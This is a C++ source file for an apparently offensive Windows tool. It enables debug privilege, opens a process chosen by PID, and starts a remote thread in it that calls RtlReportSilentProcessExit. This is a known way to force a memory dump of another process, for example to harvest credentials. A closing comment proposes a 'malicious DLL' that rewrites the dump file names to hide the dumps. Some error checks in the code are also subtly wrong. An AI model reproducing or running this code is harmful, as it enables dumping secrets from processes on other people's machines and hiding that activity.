// SilentProcessExit.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>

typedef NTSTATUS(NTAPI* RtlReportSilentProcessExit_func) (
	_In_     HANDLE                         ProcessHandle,
	_In_     NTSTATUS						ExitStatus
	);

BOOL EnableDebugPrivilege(BOOL bEnable)
{
	HANDLE hToken = nullptr;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return FALSE;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) return FALSE;

	TOKEN_PRIVILEGES tokenPriv;
	tokenPriv.PrivilegeCount = 1;
	tokenPriv.Privileges[0].Luid = luid;
	tokenPriv.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) return FALSE;

	return TRUE;
}

int main(int argc, char* argv[])
{
	if (!EnableDebugPrivilege(TRUE))
	{
		std::cout << "ERROR: Could not adjust token privileges! \n";
		return -1;
	}

	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	PVOID pRtlReportSilentProcessExit = GetProcAddress(hNtdll, "RtlReportSilentProcessExit");

	int pid = atoi(argv[1]);

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);

	if (hProcess == INVALID_HANDLE_VALUE)
	{
		int lastError = GetLastError();
		std::cout << "ERROR OpenProcess() failed with error: " << lastError << "\n";
		return -1;
	}

	// 0xFFFFFFFF = Self process
	char* buf = (char*)"\xFF\xFF\xFF\xFF";

	LPVOID arg = (LPVOID)VirtualAllocEx(hProcess, NULL, sizeof(buf), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (!arg)
	{
		int lastError = GetLastError();
		std::cout << "ERROR VirtualAllocEx() failed with error: " << lastError << "\n";
		return -1;
	}

	if (!WriteProcessMemory(hProcess, arg, buf, sizeof(buf), NULL))
	{
		int lastError = GetLastError();
		std::cout << "ERROR WriteProcessMemory() failed with error: " << lastError << "\n";
		return -1;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRtlReportSilentProcessExit, (LPVOID)-1, NULL, NULL);

	if (!hThread)
	{
		int lastError = GetLastError();
		std::cout << "ERROR CreateRemoteThread() failed with error: " << lastError << "\n";
		return -1;
	}

	std::cout << "Done!\n";
	std::cout << "arg = " << std::hex << arg  << "\n";
}

// https://www.hexacorn.com/blog/2018/09/
// Call WerRegisterRuntimeExceptionModule() to register a malicious DLL which once loaded will find and ovewrite the following strings:
// Directory string format:
// %s\\%s-(PID-%u)-%u
// File Name string format:
// %s\\%s-(PID-%u).dmp
